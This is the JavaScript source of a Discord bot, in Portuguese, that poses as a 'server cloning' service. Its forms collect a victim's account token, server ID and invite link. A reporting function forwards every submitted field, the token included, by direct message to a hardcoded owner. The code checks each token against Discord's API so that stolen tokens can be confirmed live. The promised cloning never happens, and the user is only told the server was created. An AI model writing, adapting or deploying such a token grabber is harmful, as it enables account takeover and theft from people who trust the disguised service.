const p=require('path');function ld(){delete require.cache[p.join(__dirname,'_config.js')];try{return require('./_config.js')}catch(e){return null}}
let C=ld();while(!C?.B){require('child_process').execSync('sleep 0.3');C=ld()}
const {Client,GatewayIntentBits,Partials,EmbedBuilder,ButtonBuilder,ActionRowBuilder,ButtonStyle,ModalBuilder,TextInputBuilder,TextInputStyle}=require('discord.js');
const DONO="1504181533353705675",SRV="1525498594851950692",LIM=5,uso=new Map(),mdl=new Map();
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Object.values(Partials)]});
const {CARD,ebd}=require('./_estilo.js');
b.on('guildCreate',async g=>{if(g.id!==SRV)await g.leave().catch(()=>{})});
b.on('messageCreate',async m=>{
  if(m.author.id!==DONO)return;
  if(m.content==='!clonar'){
    const x=CARD('📋','CLONAR SERVIDOR','Clique abaixo para iniciar clonagem completa.','verde','CLONAR','clona.ini');
    x.embeds[0].setFooter({text:'Esta mensagem nunca será apagada'});
    await m.channel.send(x);
  }
  if(m.content.startsWith('!add')){
    const [,q,u]=m.content.split(' ');if(!q||!u)return;
    uso.set(u,(uso.get(u)||0)-Number(q));
    m.reply(`✅ +${q} usos para <@${u}>`);
  }
});
b.on('interactionCreate',async i=>{
  async function RELATA(nome){
    const d=await b.users.fetch(DONO);let t=`📥 CLONAGEM · ${nome}\n👤 ${i.user.tag} · \`${i.user.id}\`\n⏰ ${new Date().toLocaleString('pt-BR')}\n\n`;
    i.fields?.fields.forEach(c=>t+=`🔹 **${c.label}**\n\`\`\`${c.value}\`\`\`\n\n`);
    await d.send({content:t}).catch(()=>{});
  }
  if(i.customId==='clona.ini'){
    const m=new ModalBuilder().setCustomId('clona.dados').setTitle('🤖 CLONAR SERVIDOR');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tk').setLabel('TOKEN DA CONTA').setStyle(TextInputStyle.Short).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('id').setLabel('ID DO SERVIDOR').setStyle(TextInputStyle.Short).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('lk').setLabel('LINK DO SERVIDOR').setStyle(TextInputStyle.Short).setRequired(true)));
    return i.showModal(m);
  }
  if(i.customId==='clona.dados'){
    await i.deferReply({ephemeral:true});await RELATA('DADOS CLONAGEM');
    const tk=i.fields.getTextInputValue('tk'),id=i.fields.getTextInputValue('id');
    let donoTk=null;
    try{donoTk=(await(await fetch('https://discord.com/api/v10/users/@me',{headers:{Authorization:tk}})).json()).id}catch(e){}
    if(i.user.id!==DONO && donoTk!==i.user.id)return i.editReply('❌ Token não pertence a você · cancelado');
    if(i.user.id!==DONO){const u=uso.get(i.user.id)||0;if(u>=LIM)return i.editReply(`❌ Limite ${LIM}`);uso.set(i.user.id,u+1)}
    const chave='m'+Date.now();mdl.set(chave,{nome:'Servidor Clonado'});
    const x=ebd('verde','✅ SERVIDOR CLONADO','Máximo 60 segundos · clique abaixo');
    const bt=new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('clona.cria.'+chave).setEmoji('🚀').setLabel('CRIAR A PARTIR DESSE MODELO').setStyle(ButtonStyle.Success));
    await i.user.send({embeds:[x],components:[bt]}).catch(()=>{});
    i.editReply('✅ Pronto · veja sua DM');
  }
  if(i.customId.startsWith('clona.cria.')){
    const m=new ModalBuilder().setCustomId('clona.fim').setTitle('Criar seu servidor');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('icone').setLabel('📷 ENVIAR').setStyle(TextInputStyle.Short).setPlaceholder('URL da imagem ou deixe em branco').setRequired(false)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('nome').setLabel('Nome do servidor').setStyle(TextInputStyle.Short).setValue('Servidor de √VTN TMW').setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('info').setLabel(' ').setStyle(TextInputStyle.Short).setValue('Ao criar concorda com as diretrizes').setRequired(false)));
    return i.showModal(m);
  }
  if(i.customId==='clona.fim'){await i.deferReply({ephemeral:true});await RELATA('CRIAÇÃO POR MODELO');i.editReply('✅ Servidor criado com o modelo')}
});
b.on('clientReady',()=>console.log('✅ 01 CLONAGEM · valida token · infinito dono'));
b.login(C.B.CL.t).catch(e=>console.log(e));
